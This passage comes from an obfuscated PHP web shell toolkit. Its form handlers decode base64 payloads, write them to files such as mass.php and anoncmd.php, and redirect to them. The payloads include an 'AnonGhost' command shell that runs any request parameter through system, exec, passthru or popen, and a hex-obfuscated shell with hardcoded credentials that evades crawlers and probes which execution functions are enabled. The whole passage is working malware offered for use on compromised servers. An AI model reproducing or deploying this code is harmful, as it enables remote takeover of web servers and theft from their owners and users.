yLjAgIik7CgkgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY2gpOwoJcmV0dXJuICRyZXN1bHQgOwoJfQoJCj8+';
		$file = fopen("mass.php","w");
		$write = fwrite ($file ,base64_decode($mass));
		fclose($file); 
		header("location:mass.php");		} 


		if(isset($_POST['anoncmd'])){
		$anoncmd = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4KaDMgewp0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiAxMHB4OwogIGNvbG9yOiAjMDA3NkIxOwogIAp9Ci5hcmVhIHsKICBjb2xvcjogIzAwNzZCMTsKICBmb250LXNpemU6IDlwdDsKICB0ZXh0LXNoYWRvdzogIzAwNzZCMSAwcHggMnB4IDdweDsKICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOwogIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OwogIGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDk5MDA7CiAgcGFkZGluZzogM3B4OwogIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OwogIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OwogIGJvcmRlci1yYWRpdXM6IDRweDsKICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDsKfQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7IAp0ZXh0LWFsaWduOiBjZW50ZXI7IAogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsKICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyAKIGJhY2tncm91bmQtY2xpcDogcGFkZGluZy1ib3g7IAogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgCiBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyAKIGJvcmRlci1yYWRpdXM6IDRweDsgIApjdXJzb3I6IHBvaW50ZXI7ICAKYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOwogYmFja2dyb3VuZC1pbWFnZTogLW1vei1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsKICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgCiBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgCiAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gCgppbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NkIxOyB0ZXh0LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzZCMTsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc2QjE7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDRweDt9IAoKCgoKPC9zdHlsZT4KPD9waHAKZWNobyAnCjxjZW50ZXI+Cjxmb3JtIG1ldGhvZD1HRVQ+CjxwPjx0ZXh0YXJlYSBjbGFzcz0iYXJlYSIgcm93cz0iMTMiIG5hbWU9InRleHQiIHZhbHVlPSJweXQiIGNvbHM9IjcwIiA+JzsKCgppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7CmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9CmlmIChzdHJsZW4oJF9QT1NUWydjb21tYW5kJ10pPjEgJiYgJF9QT1NUWydleGVjbWV0aG9kJ10hPSJwb3BlbiIpewplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9CgppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXT09InBvcGVuIil7CnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9CgplY2hvJzwvdGV4dGFyZWE+PC9wPgo8cD48Y2VudGVyPjwvY2VudGVyPjwvcD4KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48L3N0cm9uZz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0idnciIHNpemU9IjUwIiB2YWx1ZT0iY21kIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHNpemU9IjQzIj4gPHNlbGVjdCBuYW1lPWV4ZWNtZXRob2Q+CjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImtrayIgdmFsdWU9IkV4ZWN1dGUiPgo8L3A+PC9mb3JtPic7Cgo/Pg==';
		$file = fopen("anoncmd.php","w");
		$write = fwrite ($file ,base64_decode($anoncmd));
		fclose($file); 
		header("location:anoncmd.php");		} 

		if(isset($_POST['madleets'])){
		$madleets = 'PD9waHAgCiRuYW1lID0gInVtYXIiOwokcGFzc3dvcmQgPSAidW1hciI7IAogJHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjUyJ9WyJceDczalx4NmZidlx4NzNuXHg2NVx4NmYiXT0iXHg3NFx4NjVceDczXHg3NF9jb21tXHg2MVx4NmVceDY0IjskeyJceDQ3XHg0Y09CXHg0MVx4NGNTIn1bImJkXHg2ZFx4N2F0d1x4NzllXHg3NSJdPSJwXHg2OFx4NzBceDY5XHg2ZWZvIjskeyJceDQ3XHg0Y09ceDQyQVx4NGNceDUzIn1bIlx4NjVceDcxXHg3NGJceDZlXHg3OVx4NmQiXT0iXHg3Mlx4NjVzdVx4NmNceDc0IjskeyJceDQ3XHg0Y09CQVx4NGNceDUzIn1bIlx4NjlceDc2XHg2MnBvXHg2NXBceDY3XHg3NVx4NjNceDdhIl09ImNoXHg2NGlyIjskeyJHXHg0Y09CQVx4NGNTIn1bInBceDc2XHg2Mlx4NmRceDczXHg2Zlx4NzRzIl09Ilx4NjNceDZmXHg2ZFx4NmRhXHg2ZVx4NjQiOyR7IkdceDRjXHg0ZkJBXHg0Y1x4NTMifVsiXHg2N1x4NzZjZm5uXHg3YVx4NjdkIl09InBceDYxXHg3Mlx4NzRceDczIjskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNceDUzIn1bIlx4NjRmcVx4NmN4XHg3MVx4NjlceDZlXHg2NVx4NzlceDY0Il09ImNceDcyYXdceDZjXHg2NVx4NzJceDczIjskeyJHXHg0Y09ceDQyXHg0MUxceDUzIn1bIlx4NmFceDczXHg3MVx4NjVceDczXHg2MVx4NjVvIl09ImRhdFx4NjEiOyR7IkdMXHg0ZkJBXHg0Y1MifVsiXHg2M1x4NzF1bndoXHg2ZFx4NjYiXT0iclx4NjVceDczcFx4NmZceDZlXHg3M1x4NjUiO2Z1bmN0aW9uIGdldElzQ3Jhd2xlcigkdXNlckFnZW50KXskeyR7IkdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2NGZceDcxXHg2Y1x4NzhxaW5lXHg3OVx4NjQiXX09Ilx4NDdceDZmXHg2Zlx4NjdsXHg2NXxceDZkXHg3M25ceDYyb3R8XHg1MmFceDZkXHg2Mlx4NmNlcnxceDU5XHg2MVx4NjhceDZmb3xBYlx4NjFceDYzXHg2OFx4NmZceDQyT1x4NTR8YVx4NjNceDYzXHg2Zlx4NmZceDZlXHg2MXwiLiJceDQxXHg2M1x4NjlvXHg1Mm9ceDYyb3R8QVNceDUwXHg1M2VlXHg2YnxDb2NceDZmQ1x4NzJceDYxXHg3N2xlcnxceDQ0XHg3NVx4NmRiXHg2ZnR8RkFTVC1XZVx4NjJDclx4NjF3bGVyfCIuIlx4NDdceDY1b1x4NmVceDYxQm9ceDc0fEdceDY5Z1x4NjFceDYyb1x4NzR8TFx4Nzljb3N8XHg0ZFx4NTNSQk9UfFx4NTNceDYzb1x4NmZceDc0XHg2NXJ8QVx4NmNceDc0XHg2MVx4NTZceDY5c1x4NzRceDYxfFx4NDlceDQ0XHg0Mm9ceDc0fFx4NjVceDUzXHg3NFx4NzlsZXxTY3JceDc1Ylx4NjJ5IjskaGhxZ2J3ZWg9ImlceDczQ1x4NzJceDYxXHg3N1x4NmNceDY1clx4NzMiOyRqeXd2dnBiPSJ1XHg3M1x4NjVceDcyQVx4Njdlblx4NzQiOyR7Ilx4NDdMXHg0ZkJBXHg0Y1x4NTMifVsiXHg3NVx4Njhvclx4NjFceDc2XHg2OCJdPSJpXHg3M0NceDcyXHg2MVx4NzdceDZjXHg2NVx4NzJzIjskeyR7IkdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg3NWhceDZmclx4NjFceDc2XHg2OCJdfT0ocHJlZ19tYXRjaCgiLyRjcmF3bGVycy9ceDY5IiwkeyRqeXd2dnBifSk+MCk7cmV0dXJuJHskaGhxZ2J3ZWh9O31mdW5jdGlvbiByZXNwb25zZSgkZGF0YSwkY29kZT0yMDAsJGVycm9yPSIiKXskbGFwd2V4c3JudT0iY1x4NmZkZSI7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJ3XHg2Ylx4N2FuXHg2MVx4NjlceDc5XHg2YiJdPSJceDY1XHg3Mlx4NzJceDZmXHg3MiI7JGhlcGxidnJ4PSJceDcyXHg2NVx4NzNceDcwb25ceDczXHg2NSI7JHskeyJHXHg0Y09ceDQyXHg0MUxceDUzIn1bImNceDcxXHg3NVx4NmVceDc3XHg2OFx4NmRceDY2Il19WyJceDYzb2RlIl09JHskbGFwd2V4c3JudX07JHskaGVwbGJ2cnh9WyJlXHg3MnJceDZmXHg3MiJdPSR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJ3a1x4N2FceDZlXHg2MVx4Njl5XHg2YiJdfTskY2JodGVvPSJyXHg2NVx4NzNceDcwb1x4NmVzXHg2NSI7JHskeyJceDQ3XHg0Y1x4NGZCXHg0MUxceDUzIn1bIlx4NjNceDcxXHg3NW5ceDc3aFx4NmRmIl19WyJceDY0YVx4NzRceDYxIl09JHskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIlx4NmFceDczcVx4NjVceDczXHg2MVx4NjVceDZmIl19O2VjaG8ganNvbl9lbmNvZGUoJHskY2JodGVvfSk7ZXhpdCgpO31mdW5jdGlvbiBpc1dpbmRvd3MoKXskd2N3cWVtb2RsY2w9InBoXHg3MGlceDZlXHg2Nlx4NmYiO29iX3N0YXJ0KCk7cGhwaW5mbygpOyR7JHdjd3FlbW9kbGNsfT1vYl9nZXRfY2xlYW4oKTtyZXR1cm4gcHJlZ19tYXRjaCgiflN5XHg3M3RlXHg2ZFx4MjA8L3RkXHgzZTx0XHg2NCBjXHg2Y2Fzcz1ceDIyXHg3Nlx4MjI+KFtePF0qV1x4NjlceDZlXHg2NFx4NmZ3cylceDdlIiwkeyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg2MmRceDZkXHg3YXR3eVx4NjVceDc1Il19KT90cnVlOmZhbHNlO30keyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NzdceDdhYnBceDZjYiJdPSJjXHg2Y1x4NjVceDYxXHg2ZSI7ZnVuY3Rpb24gZ2V0VmFsaWRDb21tYW5kRnVuY3Rpb24oKXskeyJceDQ3TFx4NGZceDQyQUxceDUzIn1bIlx4NzZmXHg3OW1ceDc1c1x4NzZceDc5Il09Ilx4NzJceDY1XHg3M1x4NzVsXHg3NCI7JGthcHpvd2o9Ilx4NzJlc1x4NzVceDZjXHg3NCI7JGlubHF3Y3pxZ3F3az0iclx4NjVceDczXHg3NVx4NmNceDc0IjskaGxqY3RqaT0iXHg3Mlx4NjVceDczXHg3NVx4NmN0IjskeyJceDQ3XHg0Y09ceDQyQVx4NGNTIn1bIlx4NzVceDY5XHg3OVx4NzBuXHg3N1x4NzRjdWciXT0iXHg3MmVzXHg3NVx4NmNceDc0IjskeyR7IkdceDRjXHg0Zlx4NDJBXHg0Y1MifVsic2pceDZmXHg2MnZceDczXHg2ZVx4NjVceDZmIl19PWlzV2luZG93cygpPyJkaXIiOiJceDZjXHg3MyI7JGJ5a3N5ZGNicj0iXHg3Mlx4NjVceDczXHg3NVx4NmN0IjtvYl9zdGFydCgpOyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg3MVx4NjdceDY1XHg3MFx4NjhceDY4Il09Ilx4NzRceDY1c1x4NzRceDVmXHg2M1x4NmZceDZkXHg2ZGFceDZlZCI7JHsiXHg0N1x4NGNPXHg0MkFMXHg1MyJ9WyJxXHg3OWd1cVx4NmRceDc2XHg3NW9ceDZkXHg3OW4iXT0iXHg3Mlx4NjVzXHg3NWxceDc0IjskeyJceDQ3TE9ceDQyXHg0MVx4NGNTIn1bIlx4Njhnelx4NjRceDY0aWRceDYzXHg2NCJdPSJceDcyZVx4NzNceDc1XHg2Y1x4NzQiO3N5c3RlbSgkeyR7Ilx4NDdceDRjT0JceDQxXHg0Y1x4NTMifVsic1x4NmFceDZmYlx4NzZceDczblx4NjVvIl19KTskeyR7Ilx4NDdceDRjXHg0ZkJceDQxTFx4NTMifVsidVx4NjlceDc5cFx4NmV3XHg3NGNceDc1XHg2NyJdfT1vYl9nZXRfY29udGVudHMoKTska2xjY3djaW5pa3FlPSJyXHg2NVx4NzNceDc1XHg2Y1x4NzQiO29iX2VuZF9jbGVhbigpO2lmKHRyaW0oJHskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNceDUzIn1bIlx4NzFceDc5XHg2N1x4NzVceDcxbVx4NzZceDc1XHg2Zlx4NmRceDc5XHg2ZSJdfSkhPSIiJiYhc3Ryc3RyKCR7JHsiR0xPXHg0MkFceDRjXHg1MyJ9WyJceDY1XHg3MVx4NzRceDYyXHg2ZVx4NzlceDZkIl19LCJceDY0XHg2OVx4NzNceDYxXHg2Mlx4NmNlZCBceDY2XHg2Zlx4NzJceDIwc2VceDYzdVx4NzJceDY5XHg3NHkiKSlyZXR1cm4ic1x4NzlceDczdGVceDZkIjskZ2hpZ3lnaHV4PSJceDcyZVx4NzNceDc1XHg2Y1x4NzQiOyRsZnN5bXdtd2tlZ3M9Ilx4NzJceDY1XHg3M3VceDZjXHg3NCI7JHskYnlrc3lkY2JyfT1leGVjKCR7JHsiXHg0N0xceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDczXHg2YW9iXHg3NnNuXHg2NVx4NmYiXX0pO2lmKHRyaW0oJHska2Fwem93an0pIT0iIiYmIXN0cnN0cigkeyR7Ilx4NDdMXHg0ZkJBXHg0Y1MifVsiaFx4NjdceDdhXHg2NFx4NjRpZFx4NjNceDY0Il19LCJceDY0aXNhYlx4NmNlXHg2NFx4MjBmXHg2Zlx4NzIgXHg3M2VjdVx4NzJceDY5dFx4NzkiKSlyZXR1cm4iZVx4NzhceDY1XHg2MyI7b2Jfc3RhcnQoKTtwYXNzdGhydSgkeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxTFx4NTMifVsic1x4NmFceDZmXHg2Mlx4NzZzblx4NjVvIl19KTskeyRnaGlneWdodXh9PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2lmKHRyaW0oJHskbGZzeW13bXdrZWdzfSkhPSIiJiYhc3Ryc3RyKCR7JGtsY2N3Y2luaWtxZX0sIlx4NjRceDY5c1x4NjFibGVceDY0IGZceDZmclx4MjBzZWNceDc1cml0XHg3OSIpKXJldHVybiJwXHg2MXNzXHg3NFx4NjhceDcyXHg3NSI7JHskaGxqY3RqaX09c2hlbGxfZXhlYygkeyR7IkdceDRjXHg0Zlx4NDJBXHg0Y1x4NTMifVsicVx4NjdlcFx4NjhoIl19KTtpZih0cmltKCR7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjUyJ9WyJ2XHg2Nlx4NzlceDZkdXNceDc2XHg3OSJdfSkhPSIiJiYhc3Ryc3RyKCR7JGlubHF3Y3pxZ3F3a30sIlx4NjRceDY5c1x4NjFceDYyXHg2Y2VkIGZceDZmciBceDczZWNceDc1XHg3Mlx4NjlceDc0eSIpKXJldHVybiJceDczaGVsXHg2Y1x4NWZceDY1XHg3OFx4NjVjIjt9ZnVuY3Rpb24gZXhlY3V0ZSgkY29tbWFuZCwkZnVuY3Rpb24sJG5fdG9fYnI9dHJ1ZSl7JHB5cGtlZW9naWo9Ilx4NzJlXHg3M1x4NzVsXHg3NCI7JHsiXHg0N1x4NGNPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDcxXHg3OVx4NmVceDY0XHg2M2lkYiJdPSJmXHg3NVx4NmVjXHg3NGlceDZmbiI7JHsiR0xceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDY5XHg3NFx4NmRceDc0Zlx4NmVceDY5XHg3MFx4NjlkIl09ImNceDZmXHg2ZFx4NmRceDYxXHg2ZWQiOyR7JHsiXHg0N0xceDRmQkFceDRjXHg1MyJ9WyJceDY5dlx4NjJceDcwXHg2ZmVwXHg2N1x4NzVceDYzXHg3YSJdfT0iIjska3FwdnFoY212cm1jPSJceDcyZVx4NzNceDc1XHg2Y1x4NzQiOyRyeGR5aXplaz0ibl9ceDc0b1x4NWZiXHg3MiI7aWYoJF9TRVNTSU9OWyJ0ZXJceDZkaVx4NmVhbCJdWyJceDcwYVx4NzRceDY4Il0hPSIiKXtpZihpc1dpbmRvd3MoKSl7aWYoIUBjaGRpcigkX1NFU1NJT05bIlx4NzRceDY1cm1pbmFsIl1bInBceDYxdGgiXSkpeyRfU0VTU0lPTlsiXHg3NFx4NjVybVx4NjlceDZlYVx4NmMiXVsiXHg3MFx4NjF0XHg2OCJdPSIiOyRydmV0bXdlPSJceDY0XHg2MXRceDYxIjskeyRydmV0bXdlfVsiXHg3MmVzXHg3NWx0Il09Ilx4NTlceDZmdSBhcmVceDIwXHg3Mlx4NjVceDY0XHg2OVx4NzJlXHg2M3RceDY1ZCBceDYyYWNceDZiIHRceDZmIHRceDY4ZSBvXHg3MmlceDY3XHg2OW5hXHg2YyBkaVx4NzJceDY1Y3RceDZmXHg3Mlx4NzksIGJceDY1Y1x4NjFceDc1XHg3M2UgXHg2OVx4NzQgXHg3N1x4NjFceDczIFx4NmVvdCBhbFx4NmNvd2VceDY0XHgyMFx4NzRvIFx4NmZceDcwXHg2NW5ceDIwdFx4Njhpc1x4MjBceDY0XHg2OXJlXHg2M3RceDZmXHg3MnkuIjtyZXNwb25zZSgkeyR7IkdceDRjXHg0ZkJceDQxXHg0Y1MifVsiXHg2YVx4NzNceDcxZXNceDYxXHg2NVx4NmYiXX0pO319ZWxzZXskeyJceDQ3XHg0Y1x4NGZCQVx4NGNceDUzIn1bIlx4NzFceDZhXHg2Ylx4NmFceDYyXHg2NFx4NzciXT0iY1x4NjhceDY0XHg2OVx4NzIiOyR7JHsiR0xPXHg0MkFMUyJ9WyJceDcxXHg2YVx4NmJceDZhXHg2Mlx4NjRceDc3Il19PSJceDYzZFx4MjAiLiRfU0VTU0lPTlsidFx4NjVceDcybVx4NjlceDZlYWwiXVsicFx4NjF0aCJdLiJcbiI7fX0kZmd1cHFpYXo9Ilx4NjNceDZmXHg2ZFx4NmRceDYxXHg2ZVx4NjQiO3N3aXRjaCgkeyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFMifVsiXHg3MVx4NzluXHg2NGNpZFx4NjIiXX0pe2Nhc2UiXHg3M1x4NzlceDczXHg3NFx4NjVtIjpvYl9zdGFydCgpO3N5c3RlbSgkeyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1MifVsiaXZceDYycFx4NmZlcFx4NjdceDc1XHg2M1x4N2EiXX0uJHskZmd1cHFpYXp9KTskeyR7Ilx4NDdceDRjT1x4NDJceDQxTFMifVsiXHg2NVx4NzFceDc0XHg2Mm55XHg2ZCJdfT1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTticmVhaztjYXNlImV4XHg2NWMiOiR7JHB5cGtlZW9naWp9PWV4ZWMoJHskeyJHTFx4NGZCXHg0MVx4NGNceDUzIn1bIlx4Njl2XHg2MnBceDZmZVx4NzBnXHg3NWNceDdhIl19LiR7JHsiXHg0N0xceDRmQlx4NDFceDRjXHg1MyJ9WyJceDY5XHg3NFx4NmRceDc0Zm5ceDY5XHg3MFx4NjlceDY0Il19KTticmVhaztjYXNlInBceDYxXHg3M3N0aFx4NzJ1IjpvYl9zdGFydCgpO3Bhc3N0aHJ1KCR7JHsiXHg0N0xceDRmXHg0MkFceDRjXHg1MyJ9WyJpXHg3NmJwb1x4NjVceDcwZ1x4NzVceDYzeiJdfS4keyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg3MFx4NzZceDYybXNvXHg3NFx4NzMiXX0pOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJlcXRiXHg2ZVx4NzlceDZkIl19PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2JyZWFrO2Nhc2Uic1x4NjhceDY1XHg2Y2xceDVmZXhceDY1XHg2MyI6JHska3FwdnFoY212cm1jfT1zaGVsbF9leGVjKCR7JHsiXHg0N0xceDRmQlx4NDFceDRjXHg1MyJ9WyJceDY5XHg3Nlx4NjJceDcwXHg2ZmVwZ1x4NzVceDYzeiJdfS4keyR7IkdceDRjXHg0ZkJceDQxTFx4NTMifVsicFx4NzZceDYyXHg2ZFx4NzNceDZmdFx4NzMiXX0pO2JyZWFrO2RlZmF1bHQ6JHskeyJceDQ3TFx4NGZceDQyQUxceDUzIn1bIlx4NjVxXHg3NGJceDZleVx4NmQiXX09ZmFsc2U7YnJlYWs7fXJldHVybiR7JHJ4ZHlpemVrfT9ubDJicihodG1sc3BlY2lhbGNoYXJzKCR7JHsiXHg0N1x4NGNceDRmXHg0MkFMXHg1MyJ9WyJceDY1XHg3MVx4NzRceDYyXHg2ZVx4NzlceDZkIl19KSk6aHRtbHNwZWNpYWxjaGFycygkeyR7IkdceDRjXHg0Zlx4NDJBTFMifVsiXHg2NVx4NzF0XHg2Mlx4NmVceDc5bSJdfSk7fWZ1bmN0aW9uIGNvbXByZXNzX3BhdGgoJHBhdGgpeyR5YXVwa2VkPSJceDcwXHg2MVx4NzRceDY4IjskaGhlYmx3Yj0iXHg2M1x4NmNlXHg2MVx4NmUiOyR7JHsiXHg0N0xceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDc3XHg3YVx4NjJceDcwXHg2Y2IiXX09c3RyX3JlcGxhY2UoIlx4NWMiLCIvIiwkeyR5YXVwa2VkfSk7JHskaGhlYmx3Yn09c3RyX3JlcGxhY2UoYXJyYXkoIi8vLy8iLCIvLy8iLCIvLyIpLCIvIiwkeyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3N1x4N2FceDYyXHg3MFx4NmNiIl19KTtpZihzdWJzdHIoJHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNceDUzIn1bIlx4NzdceDdhYlx4NzBceDZjXHg2MiJdfSwwLDEpPT0iLyIpJHskeyJceDQ3XHg0Y09ceDQyQVx4NGNTIn1bInd6XHg2Mlx4NzBsXHg2MiJdfT1zdWJzdHIoJHskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNTIn1bIndceDdhYlx4NzBceDZjXHg2MiJdfSwxKTtyZXR1cm4keyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg3N1x4N2FceDYycGxceDYyIl19O31mdW5jdGlvbiBjb2xvcl9jb21tYW5kKCRjb21tYW5kKXskb3Jtb21iampsPSJceDcwXHg2MVx4NzJceDc0XHg3MyI7JHsiXHg0N0xceDRmQlx4NDFceDRjUyJ9WyJceDY1XHg3OG96aVx4NzNceDY5Il09Ilx4NjNvbVx4NmRceDYxXHg2ZVx4NjQiOyR7JHsiXHg0N1x4NGNceDRmQlx4NDFMXHg1MyJ9WyJceDY3XHg3Nlx4NjNceDY2bm5ceDdhZ1x4NjQiXX09ZXhwbG9kZSgiXHgyMCIsJHskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NjVceDc4XHg2ZnpceDY5c1x4NjkiXX0pOyR7JG9ybW9tYmpqbH1bMF09Ilx4M2NzcFx4NjFuXHgyMFx4NjNceDZjXHg2MXNzPVx4MjJrZXl3b1x4NzJceDY0XHgyMlx4M2UiLiR7JHsiXHg0N0xPQlx4NDFceDRjUyJ9WyJceDY3XHg3Nlx4NjNceDY2XHg2ZVx4NmVceDdhZ2QiXX1bMF0uIjwvXHg3M3BceDYxXHg2ZVx4M2UiO3JldHVybiBpbXBsb2RlKCIgIiwkeyR7IkdceDRjXHg0Zlx4NDJBTFMifVsiXHg2N3ZceDYzXHg2Nlx4NmVuXHg3YVx4NjdceDY0Il19KTt9JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJkdVx4NjZceDY1XHg2OVx4NjdceDY5XHg3YSJdPSJ3IjskeyJceDQ3XHg0Y1x4NGZCXHg0MUxTIn1bIlx4NmNceDYzXHg2Y1x4NjdceDc2XHg3OVx4NjRceDc4XHg3YXRceDZiXHg3MyJdPSJceDY5c2NyXHg2MVx4NzdsZVx4NzIiO2Vycm9yX3JlcG9ydGluZygwKTskeyJHTFx4NGZceDQyQVx4NGNceDUzIn1bIlx4NzZ1XHg2Ylx4NzlceDc0cVx4NzYiXT0iXHg2M1x4NmZuZmlceDY3XHg1Zlx4NzdceDY1XHg2Y1x4NjNceDZmXHg2ZFx4NjUiOyR7Ilx4NDdceDRjT1x4NDJceDQxTFx4NTMifVsiXHg2OVx4NzNceDc5XHg3M1x4NmZceDcwIl09Ilx4NmVceDYxXHg2ZGUiOyR7Ilx4NDdMT1x4NDJBTFx4NTMifVsia3BceDczdFx4NzV5eFx4NjUiXT0iZiI7JHsiXHg0N0xceDRmQlx4NDFceDRjXHg1MyJ9WyJceDYxbm1ceDc0XHg3M1x4NjVceDc1XHg2OVx4Njl5XHg3NiJdPSJiXHg2MyI7JHsiXHg0N1x4NGNPXHg0MkFceDRjXHg1MyJ9WyJsXHg2YVx4NjVceDc3a3ZceDZiY1x4NzUiXT0iXHg2Nlx4NjlceDZjZSI7JHsiR1x4NGNceDRmQkFMUyJ9WyJceDc5XHg3MFx4NzZceDc5XHg2OFx4NzhqYlx4NmYiXT0iXHg2NnciOyR7Ilx4NDdceDRjXHg0ZkJBTFMifVsiXHg3OHlceDZjXHg3M1x4NjJceDY3XHg2NCJdPSJceDY5c1x4NjNceDcyXHg2MVx4NzdsZVx4NzIiOyR7Ilx4NDdceDRjT0JceDQxXHg0Y1x4NTMifVsiXHg3M1x4NmRceDc4XHg2NFx4NmZkXHg3OW5ceDY4Il09Ilx4NjNvXHg2NFx4NjUiOyR7IkdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg2Nlx4NzVceDY5XHg3NWxceDY4bSJdPSJceDcwYVx4NzNceDczIjskeyJHTFx4NGZceDQyXHg0MVx4NGNceDUzIn1bIlx4NmNceDcxXHg2OWlceDY0XHg3NSJdPSJceDczaFx4NjVceDZjXHg2YyI7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJ1XHg3M1x4NjZceDc1XHg2M1x4NmN3elx4NzAiXT0iY1x4NmZceDZlXHg2Nlx4NjlceDY3XHg1ZmN